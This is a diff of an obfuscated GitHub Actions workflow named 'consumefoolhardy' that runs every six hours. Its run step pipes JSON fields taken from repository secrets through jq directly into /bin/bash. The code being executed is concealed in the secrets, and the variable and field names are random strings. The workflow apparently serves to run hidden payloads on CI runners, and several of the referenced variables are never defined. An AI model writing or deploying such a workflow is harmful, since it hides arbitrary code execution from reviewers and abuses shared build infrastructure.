@@ -1,24 +1,27 @@
 name: consumefoolhardy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 1/6 * * *'
+    - cron: '57 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: consumefoolhardy
         env:
-          izucv71: ${{ secrets.izucv71 }}
+          ttqm88135: ${{ secrets.ttqm88135 }}
         run: |
-          echo $izucv71 | jq -r .pu99 | /bin/bash
-          echo $y30811 | jq -r .ykqy29 | /bin/bash
-          echo $dgj2 | jq -r .vzeg55307 | /bin/bash
-          echo $fpc51 | jq -r .po35 | /bin/bash
-          echo $oe291 | jq -r .sheq1939 | /bin/bash
-          echo $zzlov63 | jq -r .fpgl97 | /bin/bash
-          echo $niv17325 | jq -r .b18 | /bin/bash
-          echo $ofse98 | jq -r .pmq3969 | /bin/bash
+          echo $ttqm88135 | jq -r .mrsa6 | /bin/bash
+          echo $bxza5528 | jq -r .zejk4363 | /bin/bash
+          echo $bhkf0 | jq -r .wlsnz24 | /bin/bash
+          echo $kc7338 | jq -r .upqha4859 | /bin/bash
+          echo $qqiss0509 | jq -r .u41 | /bin/bash
+          echo $piwwb2974 | jq -r .wh363 | /bin/bash
+          echo $l8742 | jq -r .m15648 | /bin/bash
+          echo $mzwr05 | jq -r .npgav10 | /bin/bash
+          echo $xwev0098 | jq -r .vrhza4485 | /bin/bash
+          echo $st168 | jq -r .qmcv531 | /bin/bash
 
